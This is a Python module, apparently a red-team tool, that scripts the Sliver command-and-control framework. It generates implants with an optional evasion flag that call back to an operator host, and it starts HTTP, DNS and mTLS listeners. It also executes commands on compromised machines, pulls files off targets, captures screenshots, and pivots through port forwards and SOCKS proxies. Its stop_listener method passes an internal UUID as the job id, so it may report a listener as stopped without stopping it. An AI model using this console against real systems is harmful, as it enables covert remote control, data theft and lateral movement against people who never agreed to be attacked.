#!/usr/bin/env python3
"""
c2_console.py — Live C2 Console wrapping Sliver v1.7.1 via sliver-client CLI.

Provides C2Console, SessionManager, ListenerManager and C2Event for
operator-facing red-team command-and-control orchestration. Every public
method returns a serialisable dict; no interactive I/O.
"""

from __future__ import annotations

import json
import logging
import os
import subprocess
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SLIVER_CLIENT = "sliver-client"
SLIVER_CONFIG = Path.home() / ".sliver" / "operator.cfg"
SESSION_LOG_DIR = Path.home() / ".sliver" / "session_logs"

SUPPORTED_OS = ("linux", "windows", "macos")
SUPPORTED_ARCH = ("amd64", "arm64", "386")
SUPPORTED_PROTOCOLS = ("mtls", "http", "dns", "tcp")

SEVERITY_LEVELS = ("info", "low", "medium", "high", "critical")


# ---------------------------------------------------------------------------
# C2Event dataclass
# ---------------------------------------------------------------------------
@dataclass
class C2Event:
    """Immutable event record produced by every C2 operation."""

    event_type: str
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    session_id: Optional[str] = None
    data: Dict[str, Any] = field(default_factory=dict)
    severity: str = "info"

    # -- helpers -------------------------------------------------------------
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    def to_json(self) -> str:
        return json.dumps(self.to_dict(), default=str)


# ---------------------------------------------------------------------------
# SessionManager
# ---------------------------------------------------------------------------
class SessionManager:
    """Track, query and export C2 session metadata and command history."""

    def __init__(self, log_dir: Path | str = SESSION_LOG_DIR) -> None:
        self._log_dir = Path(log_dir)
        self._log_dir.mkdir(parents=True, exist_ok=True)
        self._sessions: Dict[str, Dict[str, Any]] = {}
        self._history: Dict[str, List[Dict[str, Any]]] = {}

    # -- public API ----------------------------------------------------------
    def track_session(
        self,
        session_id: str,
        hostname: str = "",
        username: str = "",
        os_info: str = "",
        remote_address: str = "",
        transport: str = "",
    ) -> Dict[str, Any]:
        """Register a new session (or update an existing one)."""
        now = datetime.now(timezone.utc).isoformat()
        if session_id in self._sessions:
            self._sessions[session_id].update(
                {
                    "hostname": hostname or self._sessions[session_id].get("hostname", ""),
                    "username": username or self._sessions[session_id].get("username", ""),
                    "os_info": os_info or self._sessions[session_id].get("os_info", ""),
                    "remote_address": remote_address or self._sessions[session_id].get("remote_address", ""),
                    "transport": transport or self._sessions[session_id].get("transport", ""),
                    "last_seen": now,
                }
            )
        else:
            self._sessions[session_id] = {
                "session_id": session_id,
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "remote_address": remote_address,
                "transport": transport,
                "first_seen": now,
                "last_seen": now,
                "alive": True,
            }
        self._history.setdefault(session_id, [])
        return self._sessions[session_id]

    def get_session_history(self, session_id: str) -> List[Dict[str, Any]]:
        """Return full command/response history for *session_id*."""
        return list(self._history.get(session_id, []))

    def append_event(self, session_id: str, event: Dict[str, Any]) -> None:
        """Append an event dict to a session's history."""
        self._history.setdefault(session_id, []).append(event)

    def export_session_log(self, session_id: str, fmt: str = "json") -> Dict[str, Any]:
        """
        Write session history to disk and return metadata.

        Supported formats: ``json``, ``csv`` (simplified).
        """
        if session_id not in self._history:
            return {"error": f"session {session_id} not found"}

        ext = "json" if fmt == "json" else "csv"
        out_path = self._log_dir / f"{session_id}.{ext}"
        history = self._history[session_id]

        if fmt == "json":
            out_path.write_text(json.dumps(history, indent=2, default=str))
        else:
            if history:
                headers = list(history[0].keys())
                lines = [",".join(headers)]
                for row in history:
                    lines.append(",".join(str(row.get(h, "")) for h in headers))
                out_path.write_text("\n".join(lines))
            else:
                out_path.write_text("")

        return {
            "file": str(out_path),
            "records": len(history),
            "format": fmt,
        }

    def mark_dead(self, session_id: str) -> Dict[str, Any]:
        """Mark a session as no longer alive."""
        if session_id in self._sessions:
            self._sessions[session_id]["alive"] = False
            self._sessions[session_id]["last_seen"] = datetime.now(timezone.utc).isoformat()
        return self._sessions.get(session_id, {"error": "not found"})


# ---------------------------------------------------------------------------
# ListenerManager
# ---------------------------------------------------------------------------
class ListenerManager:
    """Manage Sliver listeners (HTTP, DNS, mTLS) via sliver-client commands."""

    def __init__(self, config_path: Path | str = SLIVER_CONFIG) -> None:
        self._config = Path(config_path)
        self._listeners: Dict[str, Dict[str, Any]] = {}

    # -- internal helpers ----------------------------------------------------
    @staticmethod
    def _run_sliver_cmd(args: List[str], timeout: int = 30) -> Dict[str, Any]:
        """Execute a ``sliver-client`` command and return structured output."""
        cmd = [SLIVER_CLIENT]
        if SLIVER_CONFIG.exists():
            cmd += ["--config", str(SLIVER_CONFIG)]
        cmd += args
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )
            return {
                "success": result.returncode == 0,
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip(),
                "command": " ".join(cmd),
            }
        except FileNotFoundError:
            return {"success": False, "error": "sliver-client not found on PATH"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "command timed out"}

    # -- public API ----------------------------------------------------------
    def list_listeners(self) -> List[Dict[str, Any]]:
        """Return all tracked listener dicts."""
        return list(self._listeners.values())

    def start_http_listener(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 80,
        domain: str = "",
        cert_file: str = "",
        key_file: str = "",
    ) -> Dict[str, Any]:
        """Start an HTTP C2 listener via ``sliver-client http``."""
        args = ["http", "--lhost", lhost, "--lport", str(lport)]
        if domain:
            args += ["--domain", domain]
        if cert_file:
            args += ["--cert", cert_file]
        if key_file:
            args += ["--key", key_file]

        result = self._run_sliver_cmd(args, timeout=60)
        listener_id = str(uuid.uuid4())[:8]
        record = {
            "listener_id": listener_id,
            "protocol": "http",
            "lhost": lhost,
            "lport": lport,
            "domain": domain,
            "started": datetime.now(timezone.utc).isoformat(),
            "status": "active" if result["success"] else "failed",
            "sliver_output": result.get("stdout", result.get("error", "")),
        }
        self._listeners[listener_id] = record
        return record

    def start_dns_listener(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 53,
        domain: str = "",
    ) -> Dict[str, Any]:
        """Start a DNS C2 listener via ``sliver-client dns``."""
        args = ["dns", "--lhost", lhost, "--lport", str(lport)]
        if domain:
            args += ["--domain", domain]

        result = self._run_sliver_cmd(args, timeout=60)
        listener_id = str(uuid.uuid4())[:8]
        record = {
            "listener_id": listener_id,
            "protocol": "dns",
            "lhost": lhost,
            "lport": lport,
            "domain": domain,
            "started": datetime.now(timezone.utc).isoformat(),
            "status": "active" if result["success"] else "failed",
            "sliver_output": result.get("stdout", result.get("error", "")),
        }
        self._listeners[listener_id] = record
        return record

    def start_mtls_listener(
        self,
        lhost: str = "0.0.0.0",
        lport: int = 8888,
        cert_file: str = "",
        key_file: str = "",
    ) -> Dict[str, Any]:
        """Start a mutual-TLS Sliver listener via ``sliver-client mtls``."""
        args = ["mtls", "--lhost", lhost, "--lport", str(lport)]
        if cert_file:
            args += ["--cert", cert_file]
        if key_file:
            args += ["--key", key_file]

        result = self._run_sliver_cmd(args, timeout=60)
        listener_id = str(uuid.uuid4())[:8]
        record = {
            "listener_id": listener_id,
            "protocol": "mtls",
            "lhost": lhost,
            "lport": lport,
            "started": datetime.now(timezone.utc).isoformat(),
            "status": "active" if result["success"] else "failed",
            "sliver_output": result.get("stdout", result.get("error", "")),
        }
        self._listeners[listener_id] = record
        return record

    def stop_listener(self, listener_id: str) -> Dict[str, Any]:
        """Stop a previously-started listener by ID."""
        record = self._listeners.get(listener_id)
        if not record:
            return {"error": f"listener {listener_id} not found"}

        protocol = record["protocol"]
        port = record["lport"]
        result = self._run_sliver_cmd(["jobs", "kill", "--job-id", listener_id])
        record["status"] = "stopped"
        record["stopped"] = datetime.now(timezone.utc).isoformat()
        record["sliver_output"] = result.get("stdout", result.get("error", ""))
        return record


# ---------------------------------------------------------------------------
# C2Console  — top-level orchestrator
# ---------------------------------------------------------------------------
class C2Console:
    """
    Unified command-and-control console built on top of Sliver v1.7.1.

    Wraps ``sliver-client`` CLI invocations and returns structured dicts
    suitable for logging, dashboards, or further automation.
    """

    def __init__(
        self,
        config_path: str | Path = SLIVER_CONFIG,
        log_dir: str | Path = SESSION_LOG_DIR,
    ) -> None:
        self._config = Path(config_path)
        self._log_dir = Path(log_dir)
        self._log_dir.mkdir(parents=True, exist_ok=True)

        self.session_mgr = SessionManager(log_dir=log_dir)
        self.listener_mgr = ListenerManager(config_path=config_path)
        self._events: List[C2Event] = []

    # -- internal helpers ----------------------------------------------------
    def _emit(self, event_type: str, data: Dict[str, Any],
              session_id: Optional[str] = None, severity: str = "info") -> C2Event:
        """Create, store and return a C2Event."""
        ev = C2Event(event_type=event_type, session_id=session_id,
                     data=data, severity=severity)
        self._events.append(ev)
        logger.info("[%s] %s session=%s severity=%s",
                    ev.timestamp, event_type, session_id, severity)
        return ev

    def _sliver(self, args: List[str], timeout: int = 60) -> Dict[str, Any]:
        """Run a sliver-client command and return structured result."""
        cmd = [SLIVER_CLIENT]
        if self._config.exists():
            cmd += ["--config", str(self._config)]
        cmd += args
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                "success": proc.returncode == 0,
                "stdout": proc.stdout.strip(),
                "stderr": proc.stderr.strip(),
                "command": " ".join(cmd),
            }
        except FileNotFoundError:
            return {"success": False, "error": "sliver-client binary not found"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "command timed out"}

    @staticmethod
    def _validate_os(os_type: str) -> Optional[str]:
        if os_type.lower() not in SUPPORTED_OS:
            return f"unsupported os_type '{os_type}'; choose from {SUPPORTED_OS}"
        return None

    @staticmethod
    def _validate_arch(arch: str) -> Optional[str]:
        if arch.lower() not in SUPPORTED_ARCH:
            return f"unsupported arch '{arch}'; choose from {SUPPORTED_ARCH}"
        return None

    @staticmethod
    def _validate_protocol(protocol: str) -> Optional[str]:
        if protocol.lower() not in SUPPORTED_PROTOCOLS:
            return f"unsupported protocol '{protocol}'; choose from {SUPPORTED_PROTOCOLS}"
        return None

    # ======================================================================
    # Session management
    # ======================================================================
    def list_sessions(self) -> List[Dict[str, Any]]:
        """Query Sliver for active sessions via ``sliver-client sessions``."""
        result = self._sliver(["sessions", "--json"])
        if not result["success"]:
            self._emit("list_sessions_failed", result, severity="medium")
            return [{"error": result.get("stderr", result.get("error", "unknown"))}]

        try:
            data = json.loads(result["stdout"])
            sessions = data if isinstance(data, list) else data.get("sessions", [])
        except json.JSONDecodeError:
            # fall back to line-based parsing
            sessions = []
            for line in result["stdout"].splitlines():
                line = line.strip()
                if not line or line.startswith("ID") or line.startswith("-"):
                    continue
                parts = line.split()
                if len(parts) >= 3:
                    sessions.append({
                        "session_id": parts[0],
                        "hostname": parts[1] if len(parts) > 1 else "",
                        "transport": parts[-1] if len(parts) > 2 else "",
                    })

        self._emit("list_sessions", {"count": len(sessions)}, severity="info")
        return sessions

    # ======================================================================
    # Implant generation
    # ======================================================================
    def generate_implant(
        self,
        os_type: str,
        arch: str,
        protocol: str,
        lhost: str,
        lport: int,
        save_name: str = "",
        save_dir: str = "",
        evasion: bool = False,
        format_: str = "shared",
    ) -> Dict[str, Any]:
        """
        Generate a Sliver implant via ``sliver-client generate``.

        Returns metadata dict with the saved file path on success.
        """
        for validator, value in [
            (self._validate_os, os_type),
            (self._validate_arch, arch),
            (self._validate_protocol, protocol),
        ]:
            err = validator(value)
            if err:
                return {"success": False, "error": err}

        if not save_name:
            ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            save_name = f"implant_{os_type}_{arch}_{protocol}_{ts}"

        args = [
            "generate",
            "--os", os_type.lower(),
            "--arch", arch.lower(),
            "--protocol", protocol.lower(),
            "--lhost", lhost,
            "--lport", str(lport),
            "--save", save_name,
        ]
        if save_dir:
            args += ["--save-dir", save_dir]
        if evasion:
            args += ["--evasion"]
        args += ["--format", format_]

        result = self._sliver(args, timeout=300)
        ev = self._emit(
            "generate_implant",
            {"os_type": os_type, "arch": arch, "protocol": protocol,
             "lhost": lhost, "lport": lport, "save_name": save_name,
             "success": result["success"]},
            severity="high",
        )
        return {
            "success": result["success"],
            "save_name": save_name,
            "command": result.get("command", ""),
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
            "event": ev.to_dict(),
        }

    # ======================================================================
    # Listener management (delegates to ListenerManager)
    # ======================================================================
    def start_listener(self, protocol: str, lhost: str, lport: int, **kwargs: Any) -> Dict[str, Any]:
        """Start a C2 listener for the given protocol."""
        err = self._validate_protocol(protocol)
        if err:
            return {"success": False, "error": err}

        proto = protocol.lower()
        if proto == "http":
            rec = self.listener_mgr.start_http_listener(lhost, lport, **kwargs)
        elif proto == "dns":
            rec = self.listener_mgr.start_dns_listener(lhost, lport, **kwargs)
        elif proto == "mtls":
            rec = self.listener_mgr.start_mtls_listener(lhost, lport, **kwargs)
        else:
            return {"success": False, "error": f"no handler for protocol '{protocol}'"}

        self._emit("start_listener", rec, severity="medium")
        return rec

    # ======================================================================
    # Session interaction
    # ======================================================================
    def interact_session(self, session_id: str, command: str) -> Dict[str, Any]:
        """Execute *command* in the context of *session_id* via Sliver ``execute``."""
        result = self._sliver(["sessions", "--interact", session_id, "execute", "--", command])
        response = {
            "session_id": session_id,
            "command": command,
            "success": result["success"],
            "output": result.get("stdout", ""),
            "error": result.get("stderr", ""),
        }
        self.session_mgr.append_event(session_id, {
            "type": "command",
            "command": command,
            "result": response,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        self._emit("interact_session", response, session_id=session_id, severity="medium")
        return response

    # ======================================================================
    # File operations
    # ======================================================================
    def upload_file(self, session_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Upload a local file to the implant's host via ``sliver-client upload``."""
        result = self._sliver([
            "sessions", "--interact", session_id,
            "upload", "--local-path", local_path, "--remote-path", remote_path,
        ], timeout=300)
        resp = {
            "session_id": session_id,
            "local_path": local_path,
            "remote_path": remote_path,
            "success": result["success"],
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
        }
        self._emit("upload_file", resp, session_id=session_id, severity="medium")
        return resp

    def download_file(self, session_id: str, remote_path: str, local_path: str = "") -> Dict[str, Any]:
        """Download a file from the target via ``sliver-client download``."""
        args = [
            "sessions", "--interact", session_id,
            "download", "--remote-path", remote_path,
        ]
        if local_path:
            args += ["--local-path", local_path]

        result = self._sliver(args, timeout=300)
        resp = {
            "session_id": session_id,
            "remote_path": remote_path,
            "local_path": local_path or f"./{Path(remote_path).name}",
            "success": result["success"],
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
        }
        self._emit("download_file", resp, session_id=session_id, severity="medium")
        return resp

    def take_screenshot(self, session_id: str) -> Dict[str, Any]:
        """Capture a screenshot on the implant's host via ``sliver-client screenshot``."""
        result = self._sliver([
            "sessions", "--interact", session_id, "screenshot",
        ], timeout=60)
        resp = {
            "session_id": session_id,
            "success": result["success"],
            "output": result.get("stdout", ""),
            "error": result.get("stderr", ""),
        }
        self._emit("take_screenshot", resp, session_id=session_id, severity="low")
        return resp

    def get_system_info(self, session_id: str) -> Dict[str, Any]:
        """Retrieve OS / host info via ``sliver-client info``."""
        result = self._sliver([
            "sessions", "--interact", session_id, "info",
        ], timeout=30)
        resp = {
            "session_id": session_id,
            "success": result["success"],
            "system_info": result.get("stdout", ""),
            "error": result.get("stderr", ""),
        }
        self._emit("get_system_info", resp, session_id=session_id, severity="info")
        # Update tracked session with fresh info
        self.session_mgr.track_session(
            session_id,
            os_info=result.get("stdout", "")[:256],
        )
        return resp

    # ======================================================================
    # Pivoting
    # ======================================================================
    def pivot(self, session_id: str, target_host: str, target_port: int,
              protocol: str = "tcp") -> Dict[str, Any]:
        """Create a reverse port-forward (pivot) via ``sliver-client lportfwd``."""
        result = self._sliver([
            "sessions", "--interact", session_id,
            "lportfwd",
            "--remote-host", target_host,
            "--remote-port", str(target_port),
            "--proto", protocol,
        ], timeout=30)
        resp = {
            "session_id": session_id,
            "target_host": target_host,
            "target_port": target_port,
            "protocol": protocol,
            "success": result["success"],
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
        }
        self._emit("pivot", resp, session_id=session_id, severity="high")
        return resp

    def pivot_to_socks(self, session_id: str, socks_host: str = "127.0.0.1",
                       socks_port: int = 1080) -> Dict[str, Any]:
        """Open a SOCKS5 proxy on *session_id* via ``sliver-client socks5``."""
        result = self._sliver([
            "sessions", "--interact", session_id,
            "socks5",
            "--host", socks_host,
            "--port", str(socks_port),
        ], timeout=30)
        resp = {
            "session_id": session_id,
            "socks_host": socks_host,
            "socks_port": socks_port,
            "success": result["success"],
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
        }
        self._emit("pivot_to_socks", resp, session_id=session_id, severity="high")
        return resp

    # ======================================================================
    # Cleanup & teardown
    # ======================================================================
    def cleanup(self, session_id: str) -> Dict[str, Any]:
        """Gracefully uninstall the implant on *session_id* via ``sliver-client rm``."""
        result = self._sliver([
            "sessions", "--interact", session_id, "rm",
        ], timeout=30)
        self.session_mgr.mark_dead(session_id)
        resp = {
            "session_id": session_id,
            "success": result["success"],
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
        }
        self._emit("cleanup", resp, session_id=session_id, severity="high")
        return resp

    def kill_session(self, session_id: str) -> Dict[str, Any]:
        """Forcefully kill the implant process via ``sliver-client kill``."""
        result = self._sliver([
            "sessions", "--interact", session_id, "kill",
        ], timeout=15)
        self.session_mgr.mark_dead(session_id)
        resp = {
            "session_id": session_id,
            "success": result["success"],
            "stdout": result.get("stdout", ""),
            "stderr": result.get("stderr", ""),
        }
        self._emit("kill_session", resp, session_id=session_id, severity="critical")
        return resp

    # ======================================================================
    # Event log
    # ======================================================================
    def get_events(self, severity: Optional[str] = None,
                   event_type: Optional[str] = None) -> List[Dict[str, Any]]:
        """Return all C2 events, optionally filtered."""
        events = self._events
        if severity:
            events = [e for e in events if e.severity == severity]
        if event_type:
            events = [e for e in events if e.event_type == event_type]
        return [e.to_dict() for e in events]

    def export_events(self, path: str = "") -> Dict[str, Any]:
        """Dump the full event log to a JSON file."""
        if not path:
            ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
            path = str(self._log_dir / f"c2_events_{ts}.json")
        Path(path).write_text(json.dumps([e.to_dict() for e in self._events],
                                         indent=2, default=str))
        return {"file": path, "count": len(self._events)}
